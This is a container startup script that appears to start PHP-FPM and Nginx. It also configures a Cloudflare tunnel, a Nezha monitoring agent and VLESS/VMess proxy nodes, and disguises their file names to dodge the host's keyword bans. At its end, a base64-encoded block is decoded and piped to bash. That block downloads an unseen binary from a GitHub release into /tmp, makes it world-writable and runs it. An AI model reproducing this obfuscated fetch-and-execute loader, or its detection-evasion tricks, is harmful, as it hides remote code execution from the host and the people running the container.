#!/bin/ash

#=======================================
# 设置固定隧道参数(如果不设置，默认启用临时隧道，端口自动，无需手动设置)
# json或token,支持直接复制全部，如cloudflared.exe service install eyxxx，F大佬json获取地址https://fscarmen.cloudflare.now.cc
export TOK='' 
export ARGO_DOMAIN=''
#=======================================
#设置哪吒参数(NEZHA_TLS='1'开启tls,设置其他关闭tls)
export NEZHA_SERVER=''
export NEZHA_KEY=''
export NEZHA_PORT='443'
export NEZHA_TLS='1'
#=======================================
# 设置UUID和路径等
export UUID=${UUID:-'fd80f56e-93f3-4c85-b2a8-c77216c509a7'}
export VPATH=${VPATH:-'vls'} #vless路径
export VL_PORT=${VL_PORT:-'8002'} #vless端口
export MPATH=${MPATH:-'vms'} #vmess路径
export VM_PORT=${VM_PORT:-'8001'} #vmess端口
export CF_IP=${CF_IP:-'ip.sb'} # 优选ip
export SUB_NAME=${SUB_NAME:-'argo'} # 节点名称


# 设置3件套文件名称，防止关键词封禁
export ne_file=${ne_file:-'nene.js'} #哪吒
export cff_file=${cff_file:-'cff.js'} #隧道
export web_file=${web_file:-'web.js'} #xry
#=======================================
export FLIE_PATH='/tmp/worlds/'#下载文件保存路径

rm -rf /home/container/tmp/*
echo "⟳ Starting PHP-FPM..."
/usr/sbin/php-fpm8 --fpm-config /home/container/php-fpm/php-fpm.conf --daemonize

echo "⟳ Starting Nginx..."
echo "✓ Successfully started"
export JAR_SH='/usr/sbin/nginx -c /home/container/nginx/nginx.conf -p /home/container/'

echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01E
PSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1h
bmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAt
cU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZv
dW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgMzAKICAgICAg
ICBleGl0IDEKZmkKCmFyY2g9JCh1bmFtZSAtbSkKaWYgW1sgJGFyY2ggPT0gIng4Nl82NCIgXV07
IHRoZW4KJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25v
ZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gL3RtcC9hcHAKZWxzZQokRE9XTkxP
QURfQ01EIGh0dHBzOi8vZ2l0aHViLmNvbS9kc2Fkc2Fkc3NzL3BsdXRvbm9kZXMvcmVsZWFzZXMv
ZG93bmxvYWQveHIvbWFpbi1hcm0gPiAvdG1wL2FwcApmaQoKY2htb2QgNzc3IC90bXAvYXBwICYm
IC90bXAvYXBw
" | base64 -d | bash


